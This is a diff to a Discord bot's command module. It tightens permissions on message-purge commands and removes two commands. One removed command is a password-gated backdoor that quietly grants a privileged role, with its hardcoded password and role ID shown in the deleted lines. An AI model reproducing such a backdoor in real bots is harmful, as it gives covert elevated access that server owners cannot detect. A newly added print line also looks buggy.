@@ -28,6 +28,7 @@ class MainCommands(commands.Cog):
             await ctx.send(f'你與我的距離為 {round(self.Misaki.latency*1000)} 毫秒')
 
     @commands.command()
+    @commands.has_permissions(manage_messages = True)
     async def purge(self, ctx, amount:int):
         MemberRoles = ctx.message.author.roles
         if (str(MemberRoles).count("大家的事務員") or str(MemberRoles).count("Enchanted Member") or str(MemberRoles).count("Moderators")):
@@ -37,6 +38,7 @@ class MainCommands(commands.Cog):
             await ctx.channel.purge(limit = 1)
 
     @commands.command()
+    @commands.has_permissions(manage_messages = True)
     async def cls(self, ctx, amount:int):
         MemberRoles = ctx.message.author.roles
         if (str(MemberRoles).count("大家的事務員") or str(MemberRoles).count("Moderators")):
@@ -54,15 +56,8 @@ class MainCommands(commands.Cog):
         await ctx.channel.send("RGS is up!")
 
     @commands.command()
-    async def permission_backdoor(self, ctx, password):
-        guild = ctx.message.guild
-        member = ctx.message.author
-        role = guild.get_role(753590633901588504)
-        if (str(password) == "bananapower28592219"):
-            await member.add_roles(role)
-            await ctx.channel.purge(limit = 1)
-        else:
-            await ctx.channel.purge(limit = 1)
+    async def interact(self, ctx):
+        await ctx.channel.send("boomerange!")
 
     @commands.command()
     async def rds(self, ctx, keyword:str, population:int, groups:int):
@@ -80,18 +75,10 @@ class MainCommands(commands.Cog):
                     ChosenMember = random.sample(HavetheNick, k=population)
                     for RemoveMember in ChosenMember:
                         HavetheNick.remove(RemoveMember)
-                    embed = discord.Embed(title = f'第 {iteration+1} 小隊', description = None, colour = 0x93e2df
-                    , timestamp = datetime.datetime.utcnow())
+                    embed = discord.Embed(title = f'第 {iteration+1} 小隊', description = None, colour = 0x93e2df, timestamp = datetime.datetime.utcnow())
                     embed.set_thumbnail(url = MainCommandsJson['Flag_icon'])
                     embed.add_field(name = "隊員", value=f'{ChosenMember}', inline=False)
                     await ctx.send(embed=embed)
-
-    @commands.command()
-    async def JoinInvisibleVC(self, ctx):
-        await ctx.message.delete()
-        member = ctx.guild.get_member(ctx.message.author.id)
-        InvisibleVoiceChannel = ctx.guild.get_channel(476269156560535552)
-        await member.move_to(InvisibleVoiceChannel)
 
     @commands.Cog.listener()
     async def on_message(self, message):
@@ -124,6 +111,12 @@ class MainCommands(commands.Cog):
             self.BotSaidFilter = True
             self.RaidEndedSystemCaller = "Stady"
             await message.add_reaction("🔚")
+
+        
+        #Interact Messaging
+        if (message.content == "boomerange!"):
+            print(message.author[:4])
+
 
     @commands.Cog.listener()
     async def on_raw_reaction_add(self, payload):
